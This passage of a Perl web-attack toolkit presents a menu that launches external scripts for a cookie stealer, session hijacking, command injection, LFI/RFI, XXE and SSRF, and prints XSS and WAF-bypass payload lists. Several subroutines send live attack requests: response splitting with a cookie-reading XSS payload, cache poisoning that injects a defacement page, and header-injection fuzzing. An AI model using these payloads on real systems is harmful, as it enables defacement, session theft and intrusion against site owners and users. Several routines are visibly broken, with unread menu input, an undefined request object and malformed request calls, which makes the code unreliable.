	print item(),"4 - HTML POST - AutoSubmit - No User Interaction\n";
	print item(),"5 - JSON GET - Simple Request\n";
	print item(),"6 - JSON POST - Simple Request\n";
	print item(),"7 - JSON POST - Complex Request\n";
	print item(),"Enter Option: ";	
        chomp($enter=<STDIN>);	
	if ($enter =~1) {
	if (system("cat htmlget_requireuserinteraction") == 0) {
	print "\n";
	print item(),"success!\n";	
	}    
	else {
	print "\n\n";
	print item(), "Press Enter to Return\n";
	}
}
		
	if ($enter =~2) {
    if (system("cat htmlget_nouserinteraction") == 0) {
	print "\n";
	print item(),"success!\n";	
	}    
	else {
	print "\n\n";
	print item(), "Press Enter to Return\n";
	}
	}
	if ($enter =~3) {
    if (system("cat htmlpost_userinteraction") == 0) {
	print "\n";
	print item(),"success!\n";	
	}
		else {
	print "\n\n";
	print item(), "Press Enter to Return\n";
	}
	}
	if ($enter =~4) {
    if (system("cat htmlpost_nouserinteraction") == 0) {
	print "\n";
	print item(),"success!\n";		
}
	else {
	print "\n\n";
	print item(), "Press Enter to Return\n";
	}
	}
	if ($enter =~5) {
    if (system("cat jsonget_simplerequest") == 0) {
	print "\n";
	print item(),"success!\n";	
}
		else {
	print "\n\n";
	print item(), "Press Enter to Return\n";
	}
	}
	if ($enter =~6) {
    if (system("cat jsonpost_simplerequest") == 0) {
	print "\n";
	print item(),"success!\n";	
}
		else {
	print "\n\n";
	print item(), "Press Enter to Return\n";
	}
	}
	if ($enter =~7) {
    if (system("cat jsonpost_complexrequest") == 0) {
	print "\n";
	print item(),"success!\n";	
	}
		else {
	print "\n\n";
	print item(), "Press Enter to Return\n";
	}
}
}

#-----------------------------------------------#
# 17 Shell Shock Scanner		        #
#                                               #
#-----------------------------------------------#
sub Shellshock ( ) {
	print "\n";
	print item(), "Caution :\n";
	print item(), "Shellshock work on vulernable cgi modes, files or directories\n";
	print item(), "Make sure victim relates to cgi\n";
	print item(), "Examine properly each response\n";
	print item(),"1 - ShellShocker Type 1\n";
	print item(),"2 - ShellShocker Type 2\n";
	print item(),"Enter Option: ";	
        chomp($enter=<STDIN>);	
	if ($enter =~1) {
	print "\n";
if (system("./shellshock.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, make available shellshock.sh in folder\n";
	}
}
       if ($enter =~2) {	
if (system("./shocker.sh") == 0) {
	print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, make available shocker.sh in folder\n";
	}
}
}



#-------------------------------------------------------------------------------#
# 18 Cross Site Request Forgery Audit and Exploitation Toolkit		            #
#-------------------------------------------------------------------------------#
sub Csrfat ( ) {
	print "\n";
	print item(), "Loading Third Party - XSRFPROBE\n";
	if (system("./xsrfprobe.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}


#-------------------------------------------------------------------------------#
# 19 Find Available HTTP Methods                             		            #
#-------------------------------------------------------------------------------#
sub Fahttpm ( ) {
	if (system("./httpsmethods1.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 20 Find XSS in Parameters using Screaming Cobra           		            #
#-------------------------------------------------------------------------------#
sub Findxssinparameters ( ) {
	if (system("./interfacecobra.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}


#-------------------------------------------------------------------------------#
# 21 Find Missing HTTPS Methods                                                 #
#-------------------------------------------------------------------------------#
sub Findmissinghttpsmethods ( ) {
	if (system("./httpsmethods2.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 22 Server Side Request Forgery                                                #
#-------------------------------------------------------------------------------#
sub Ssrf ( ) {
	print item(), "1 - SSRF MAP\n";
    print item(), "2 - SSRF SEE SURF\n";
    print item(), "2 - Select An Option\n";
    if ($enter =~1) {	
	if (system("./ssrfmap.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}
    if ($enter =~2) {	
	if (system("./ssrf-see-surf.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}
}

#-------------------------------------------------------------------------------#
# 23 Find Available HTTPS Methods                                               #
#-------------------------------------------------------------------------------#
sub Fahttpsmethods ( ) {
	if (system("./httpsmethods1.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 24 Audit XML RPC Methods, Extract All Information              		            #
#-------------------------------------------------------------------------------#
sub Auditxmlrpc ( ) {
	print "\n";
	print item(),"1 - XML Brute Force Type 1\n";
	print item(),"2 - XML Brute Force Type 2\n";
	print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
    if ($enter =~1) {	
	if (system("./xmlrpc.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
} 
    if ($enter =~2) {	
	if (system("./xmlrpc2.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}
}


#-------------------------------------------------------------------------------#
# 25 Cookie Stealer XSS Localhost Server                    		            #
#-------------------------------------------------------------------------------#
sub Cookiestealer ( ) {
	if (system("./cookiestealer.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 2 Session Hijacking                                       		            #
#-------------------------------------------------------------------------------#
sub not_implemented ( ) {
	if (system("./sessions.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 26 Command Inections Exploits                              		            #
#-------------------------------------------------------------------------------#
sub Commandinection ( ) {
	if (system("./commix.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}


#-------------------------------------------------------------------------------#
# 27 Show JSON Endpoint XSS List                               		            #
#-------------------------------------------------------------------------------#
sub Showjson ( ) {
	if (system("cat jsonendpoint") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 29 Perform Blind,Encoded,Responsive XXE Injection            		            #
#-------------------------------------------------------------------------------#
sub Blindxxeinjection ( ) {
	print item(), "1 - XXE Injector\n";
	print item(), "2 - XXE Payload Sender\n";
	print item(), "Select An Option\n";
    if ($enter =~1) {	
	if (system("./xxeinjector.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}
    if ($enter =~2) {	
	print item(), "Copy and Paste command in your terminal with specified payload\n";
    print item(), "Refer to manual or guide \n";
	if (system("cat curl_sender") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

}

#-------------------------------------------------------------------------------#
# 30 Perform File Upload Injections                          		            #
#-------------------------------------------------------------------------------#
sub Fileupload ( ) {
	if (system("./fux.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 31 Perform Side Side Template Injection                   		            #
#-------------------------------------------------------------------------------#
sub Pssti ( ) {
	if (system("./tpl.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 32 Perform JSON Web Token Injection                          		            #
#-------------------------------------------------------------------------------#
sub Jsonwebtoken ( ) {
	if (system("./json.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 33 Perform Web Socket Injection                            		            #
#-------------------------------------------------------------------------------#
sub Pwebsocket ( ) {
	if (system("./websocket.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
	}

#-------------------------------------------------------------------------------#
# 34 Perform Amazon Bucket Injection 101 aws amazon         		            #
#-------------------------------------------------------------------------------#
sub Amazonbucket ( ) {
	print item(),"1 - Load Module Pack S3\n";
	print item(),"2 - Load Module Pack S3\n";
	print item(),"3 - Load Module Pack EC2\n";
	print item(),"4 - List all Account IDs with Information\n";
	print item(),"Enter Option: ";	
    chomp($enter=<STDIN>);
    if ($enter =~1) {	
	if (system("./aws1.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
} 

    if ($enter =~2) {	
	if (system("./aws2.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}
}


#-------------------------------------------------------------------------------#
# 35 Extract Cnames Records for Hijacking                    		            #
#-------------------------------------------------------------------------------#
sub Extractcname ( ) {
	if (system("./vasl.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 36 Perform Insecure Direct Object References - BURP AUTHz        	            #
#-------------------------------------------------------------------------------#
sub Idorburp ( ) {
	print item(), "Download BURP Plugin :\n";
	print item(), "https://github.com/PortSwigger/authz\n";
}

#-------------------------------------------------------------------------------#
# 36 Perform CSV Injection                                     		            #
#-------------------------------------------------------------------------------#
sub Performcsv ( ) {
	print item(), "Hint\n";
	print item(), "When a web application does not properly validate the contents of the CSV file\n";
	print item(), "Exploit will run in any platform then\n";
	if (system("cat csvinjection") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 37 Perform XPATH Injection                                   		            #
#-------------------------------------------------------------------------------#
sub Pxpath ( ) {
	print "\n";
	print item(), "Loading XPATH Login Injector\n";
	if (system("./xpathlogin.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 38 Find SQL, XPATH, ASP, ASPX, JAVA, JAVASCRIPT, PHP bugs                     #
#-------------------------------------------------------------------------------#
sub Findbugs ( ) {
	print "\n";
	if (system("./kra.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
	}

#-------------------------------------------------------------------------------#
# 39 Find XPath and SQL Parameter Injection                 		            #
#-------------------------------------------------------------------------------#
sub Xpathsql ( ) {
	print "\n";
	print item(), "Loading Third Party - XPATH Parameter Injector\n";
	if (system("./xpath.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}


#-------------------------------------------------------------------------------#
# 40 Show TWO-Factor Authenitcation Payloads                  		            #
#-------------------------------------------------------------------------------#
sub Ffa ( ) {
	if (system("./2fa.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}


#-------------------------------------------------------------------------------#
# 41 Mutated XSS payloads                               		            #
#-------------------------------------------------------------------------------#
sub Mutatedxsspayloads ( ) {
	if (system("cat mutatedxsspayloads") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}

}


#-------------------------------------------------------------------------------#
# 42 Stored XSS payloads                               		            #
#-------------------------------------------------------------------------------#
sub Storedxsspayloads ( ) {
	if (system("cat storedxsspayloads") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-------------------------------------------------------------------------------#
# 43 Reflected XSS payloads                                       		            #
#-------------------------------------------------------------------------------#
sub Reflectedxsspayloads ( ) {
if (system("cat reflectedxsspayloads") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
	}

#-------------------------------------------------------------------------------#
# 44 Waf bypass payloads                                       		            #
#-------------------------------------------------------------------------------#
sub Wafbypass ( ) {
	if (system("cat wafbypasspayloads") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}

}

#-----------------------------------------------#
# 45 XSS using Response Splitting Attack        #
#-----------------------------------------------#
sub Findxxsrs( ) {
print item(), "Enter URL: ";
chomp($url=<STDIN>);
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
print color("BOLD WHITE"), "\n[ + ] Checking HTTP Response Splitting [ + ]  \n";
print color("reset");
my $req = HTTP::Request->new( GET => "$url%0d%0aContent-Type:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2B-document.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4" );
my $res = $ua->request($req);
print $res->as_string (); 
#print $req->as_string (); 
if( $res->as_string () =~ m/alert/ ) {
print color("BOLD WHITE"), "[ + ] Reflection found, do confirm manually", "\n";
print color("reset");
}
elsif ($res->as_string () =~ m/Access Denied/ ) {
print color("BOLD MAGENTA"), "\n[ ! ] Reflection not found but something's up, try fuzzing \n";
print color("reset");
}
elsif ($res->as_string () =~ m/You have an error in your SQL syntax/ ) {
print color("BOLD MAGENTA"), "\n[ ! ] SQL found with error message \n";
print color("reset");
}
else {
print color("BOLD RED"), "\n[ ~ ] Reflection not found \n";
print color("reset");
}
}

	
#-----------------------------------------------#
# 46 Print External Links                       #
#-----------------------------------------------#
sub Extractlinksa ( ) {
sub canonicalise {
        my $source = $_[0];
        $canon = "";
        return ($canon) if ($source =~ /^(mailto:|telnet:|callto:)/) ;
        if ($source =~ /^\//) {
                $source = $site . $source;
                }
        $source =~ s/[\#?].*//;
        return $source;
        }

# Grab a web page and check the links from it!

foreach $page(@ARGV) {
        print "Checking $page\n";
        $html = get($page); # Read web page - from LWP::Simple
        @urls = $html =~ /\shref="?([^\s>"]+)/gi ;
        }

@externals = ();
@internals = ();

foreach $url(@urls) {
        $full = canonicalise($url);
        next unless($full);

        $counter{$full}++;

        if ($full !~ /^$site/) {
                push @externals,$full;
        } else {
                push @internals,$full;
        }

}
print color("BOLD  WHITE"), "\n\n\n							    [ + ] Internal links: [ + ]\n\n\n";
#print color("BOLD RED"), "							  ====================== \n";
print color("reset");
#print "\n\n\nInternal links:";
foreach $in(@internals) {
        print "$in";
        }

print color("BOLD  WHITE"), "\n\n\n							    [ + ] External links: [ + ]\n\n\n";
#print color("BOLD RED"), "							  ====================== \n";
print color("reset");

#print "\n\n\nExternal links: \n";
foreach $ex(@externals) {
        print "\n$ex";
        }

print color("BOLD  WHITE"), "\n\n\n							    [ + ] Duplications: [ + ] \n\n\n";
#print color("BOLD RED"), "							  ====================== \n";
print color("reset");
#print "\n\n\nDuplicate Links: \n";
foreach $url(keys %counter) {
        if ($counter{$url} > 1) {
                print $counter{$url};
                print color("BOLD RED"), "links";
                print color("reset");
                print "to $url";
        }
}
print "\n\n\n";
print color("BOLD WHITE"),"[ ! ] Extracted every single link available, for more links try more pages of domain or try crawler [ ! ] ";
print color("reset");
print "\n\n\n";
exit;
}


#-----------------------------------------------#
# 47 IMAGE DOWNLOADER                           #
#-----------------------------------------------#
sub Downloadlinksexif( ) {
my %images = (); 
my $html = get($url) 
  or die "could not get $url\n";

my $parser = HTML::LinkExtor->new(undef, $url);
$parser->parse($html);

my @all_link_refs = $parser->links();

for my $link_ref ( @all_link_refs  ) { 
  my ( $html_tag, $attr_name, $this_url ) = @$link_ref;
  if ( ($html_tag eq 'img') ) { 
    my $image_name = (split("/", $this_url))[-1];
    $images{$image_name}++;

    if ( $images{$image_name} == 1  ) { 
        my $directory = "downloaded_images";
        print "Downloading $this_url to $directory\/$image_name\n";
	unless(mkdir($directory, 0755)) {}
	open my $PIC, ">", "$directory\/$image_name";
        my $image = get($this_url);
        print $PIC $image;
 				     }   
 			      }
			              }

exit;
                             }


#-----------------------------------------------#
#48 HTTP Cache Poison Attack    #
#-----------------------------------------------#
sub Simplersa( ) {
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
print color("BOLD WHITE"), "\n[ + ] Checking HTTP Response Splitting [ + ]  \n";
print color("reset");
#my $req = HTTP::Request->new( GET => "http://$url%0d%0a%0d%0a\";alert('XSS');//" );
my $res = $ua->request($req);
print $res->as_string (); 
print $req->as_string (); 
if( $res->as_string () =~ m/alert/ ) {
print color("BOLD WHITE"), "[ + ] Found one, looks good [ + ]", "\n";
print color("reset");
}
elsif ($res->as_string () =~ m/Access Denied/ ) {
print color("BOLD MAGENTA"), "[ ! ] Reflection not found but something's up, try fuzzing [ ! ]\n\n";
print color("reset");
}
else {
print color("BOLD RED"), "[ ~ ] Reflection not found [ ~ ]\n\n";
print color("reset");
}
print "\n\n";
exit;
			      }

#-----------------------------------------------#
#49 Double Response Splitting                   #
#-----------------------------------------------#
sub Doublersa( ) {
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
print color("BOLD WHITE"), "\n[ + ] Checking HTTP Response Splitting [ + ]  \n";
print color("reset");
my $req = HTTP::Request->new( GET => "http://$url%0d%0a%0d%0a\";alert('XSS');//" );
my $res = $ua->request($req);
print $res->as_string (); 
print $req->as_string (); 
if( $res->as_string () =~ m/alert/ ) {
print color("BOLD WHITE"), "[ + ] Found one, looks good [ + ]", "\n";
print color("reset");
}
elsif ($res->as_string () =~ m/Access Denied/ ) {
print color("BOLD MAGENTA"), "[ ! ] Reflection not found but something's up, try fuzzing [ ! ]\n\n";
print color("reset");
}
else {
print color("BOLD RED"), "[ ~ ] Reflection not found [ ~ ]\n\n";
print color("reset");
}
print "\n\n";
exit;
			      }

#-----------------------------------------------#
#50 HTTP Cache Poison Attack                    #
#-----------------------------------------------#
sub Httpcachepoison( ) {
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
print color("BOLD WHITE"), "\n[ + ] Checking HTTP Cache Header Poison [ + ]  \n";
print color("reset");
my $req = HTTP::Request->new( GET => "http://$url%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1GET http://{SITE}/{REDIRECTURL}?site=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1" );
my $res = $ua->request($req);
print $res->as_string (); 
print $req->as_string (); 
if( $res->as_string () =~ m/alert/ ) {
print color("BOLD WHITE"), "[ + ] Found one, looks good [ + ]", "\n";
print color("reset");
}
elsif ($res->as_string () =~ m/Access Denied/ ) {
print color("BOLD MAGENTA"), "[ ! ] Reflection not found but something's up, try fuzzing [ ! ]\n\n";
print color("reset");
}
else {
print color("BOLD RED"), "[ ~ ] Reflection not found [ ~ ]\n\n";
print color("reset");
}
print "\n\n";
exit;
			    }

#-----------------------------------------------#
#51 HTTP Cache Inject Poison                    #
#-----------------------------------------------#
sub Httpcacheinject() {
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
print color("BOLD WHITE"), "\n[ + ] Checking HTTP Cache Header Poison [ + ]  \n";
print color("reset");
my $req = HTTP::Request->new( GET => "http://$url%0d%0aX-Injection-Header:%20document.alert() HTTP/1.1" );
my $res = $ua->request($req);
print $res->as_string (); 
print $req->as_string (); 
if( $res->as_string () =~ m/alert/ ) {
print color("BOLD WHITE"), "[ + ] Found one, looks good [ + ]", "\n";
print color("reset");
}
elsif ($res->as_string () =~ m/Access Denied/ ) {
print color("BOLD MAGENTA"), "[ ! ] Reflection not found but something's up, try fuzzing [ ! ]\n\n";
print color("reset");
}
else {
print color("BOLD RED"), "[ ~ ] Reflection not found [ ~ ]\n\n";
print color("reset");
}
print "\n\n";

my $req = HTTP::Request->new( POST => "http://$url%0d%0aAccept-Language:%20document.alert() HTTP/1.1" );
my $res = $ua->request($req);
print $res->as_string (); 
print $req->as_string (); 
if( $res->as_string () =~ m/alert/ ) {
print color("BOLD WHITE"), "[ + ] Found one, looks good [ + ]", "\n";
print color("reset");
}
elsif ($res->as_string () =~ m/Access Denied/ ) {
print color("BOLD MAGENTA"), "[ ! ] Reflection not found but something's up, try fuzzing [ ! ]\n\n";
print color("reset");
}
else {
print color("BOLD RED"), "[ ~ ] Reflection not found [ ~ ]\n\n";
print color("reset");
}
print "\n\n";

exit;
			    }

#-----------------------------------------------#
#52 HTTP Fuzzer                                 #
#-----------------------------------------------#
sub Httpfuzzer( ) {
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
print color("BOLD RED"), "\n\n								[ + ] Fuzzing HTTP Request Methods [ + ]  \n\n";
print color("BOLD RED"), "								============================== \n";
print color("reset");
my $req = HTTP::Request->new(
GET => $url,
HTTP::Headers->new(Host => google.com),
HTTP::Headers->new(Accept => "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E"),
HTTP::Headers->new(Referer => "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E"),
);
my $res = $ua->request($req);
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";

my $req = HTTP::Request->new(
DNT => "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E");
my $res = $ua->request($req);
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";

my $req = HTTP::Request->new(
X-Requested-With => "%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E");
my $res = $ua->request($req);
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";


exit;
}

#-----------------------------------------------#
# 53 IP Obfuscating                             #
#-----------------------------------------------#
sub Ipobfuscating ( ) {
    $url = "http://www.abuseipdb.com/tools/ip-address-converter?ip=$cmswaf";
#    $url = "http://dnstools.fastnext.com/index.php?fDecIP=$cmswaf";
    $request = $ua->get($url);
    $response = $request->content;

$p = HTML::TokeParser->new(\$response);
  while ($p->get_tag("tr")) {
      my @link = $p->get_trimmed_text("/tr");
      foreach(@link)
      # { print "$_\n"; }
      
    {  
	print item(),"$_\n";
        print color('reset');
        sleep(1);
    }
    if ($response =~ /error/){
        print item(),"Something Went Wrong\n\n";
        print item('Note'),"Enter IP Address\n";
    }
}

my ($a, $b, $c, $d)=($cmswaf=~/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/);
print item(),"IP ", $cmswaf." is hexadecimal ".convert($a).convert($b).convert($c).convert($d), "\n";
sub convert
{
        my ($dec)=@_;
        my $hex = sprintf("%x", $dec);
        $hex=length($hex) == 1 ? "0".$hex : $hex;
        return (uc($hex));
        
}

print item(),"IP for bbinary conversion is: "; 
system("./ip2bin.sh");


}

#-----------------------------------------------#
# 54 RFI                                        #
#-----------------------------------------------#
sub Rfi () { 
	if (system("./rfi.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}

#-----------------------------------------------#
# 55 LFI                                        #
#-----------------------------------------------#
sub Lfi () { 
	if (system("./lfi.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}


#-----------------------------------------------#
# 56 bbinary Buffer Overflow Finder              #
#-----------------------------------------------#
sub bbinary () { 
	if (system("./bbinary.sh") == 0) {
    print "\n";
	print item(), "Success!\n";
	}
	else {
	print "\n\n";
	print item(), "Error, Command Failed\n";
	}
}



#--------------------------------------------------------------#
#                            Enter                             #
#--------------------------------------------------------------#
sub enter {
    print "\n";
    print item(),"Press ";
    print color('bold red'),"[";
    print color("bold white"),"ENTER";
    print color('bold red'),"] ";
    print color("bold white"),"To Continue\n";

    local( $| ) = ( 1 );

    my $resp = <STDIN>;
    banner();
    menu();
}

#--------------------------------------------------------------#
#                             Format                           #
#--------------------------------------------------------------#
sub item
{
    my $n = shift // '!';
    return color('bold red')," ["
    , color('bold green'),"$n"
    , color('bold red'),"] "
    , color("bold white")
    ;
}

sub line_u
{
    return 
    color('bold cyan'),"	#-------------------------------------------------------# \n",
    "	#                                                       # \n";
    
}

sub line_d
{
    return
    color('bold cyan'),"	#                                                       # \n",
    color('bold cyan'),"	#-------------------------------------------------------# ",
    "                                                                    ";
}
#--------------------------------------------------------------#
#                          ~~The End~~                         #
#--------------------------------------------------------------#
